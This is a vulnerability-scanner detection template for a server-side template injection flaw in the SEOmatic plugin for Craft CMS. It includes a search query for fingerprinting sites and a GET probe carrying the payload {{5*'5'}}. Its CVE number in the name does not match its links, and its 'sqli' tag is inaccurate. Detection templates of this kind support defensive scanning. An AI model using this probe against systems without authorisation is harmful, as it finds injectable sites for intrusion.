name: CraftCMS SEOmatic Server-Side Template Injection CVE-2020-9597
manual: true
query: title="Welcome to Craft CMS" || body="href=\"http://craftcms.com/\"" || body="SEOmatic"
  || header="Craft CMS" || header="Craft CMS, SEOmatic"
transport: http
set:
  r1: randomInt(400000, 448000)
  r2: randomInt(400000, 448000)
rules:
  r0:
    request:
      method: GET
      path: /actions/seomatic/meta-container/meta-link-container/?uri={{5*'5'}}
    expression: response.status == 200 && response.body.bcontains(b"MetaLinkContainer")
      && response.body.bcontains(b"canonical") && response.body.bcontains(b"25")
expression: r0()
detail:
  links:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9757
  - https://github.com/nystudio107/craft-seomatic/blob/v3/CHANGELOG.md
  - https://github.com/giany/CVE/blob/master/CVE-2020-9757.txt
  - https://github.com/nystudio107/craft-seomatic/commit/65ab659cb6c914c7ad671af1e417c0da2431f79b
  - https://github.com/nystudio107/craft-seomatic/commit/a1c2cad7e126132d2442ec8ec8e9ab43df02cc0f
  description: Craft is a flexible, user-friendly CMS for creating custom digital
    experiences on the web and beyond.
  tags: rce,sqli
